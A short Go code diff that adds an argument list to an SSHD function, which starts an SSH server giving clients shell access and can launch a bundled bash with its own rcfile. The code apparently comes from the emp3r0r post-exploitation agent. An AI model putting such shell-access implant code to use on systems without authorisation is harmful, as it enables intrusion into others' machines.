@@ -22,7 +22,7 @@ func setWinsize(f *os.File, w, h int) {
 
 // SSHD start a ssh server to provide shell access for clients
 // the server binds local interface only
-func SSHD(shell, port string) (err error) {
+func SSHD(shell, port string, args []string) (err error) {
 	exe, err := exec.LookPath(shell)
 	if err != nil {
 		res := fmt.Sprintf("%s not found (%v), aborting", shell, err)
@@ -34,7 +34,7 @@ func SSHD(shell, port string) (err error) {
 	v_bash := emp3r0r_data.UtilsPath + "/bash"
 
 	ssh.Handle(func(s ssh.Session) {
-		cmd := exec.Command(exe)
+		cmd := exec.Command(exe, args...)
 		if shell == "bash" && util.IsFileExist(v_bash) {
 			cmd = exec.Command(v_bash, "--rcfile", emp3r0r_data.UtilsPath+"/.bashrc")
 		}
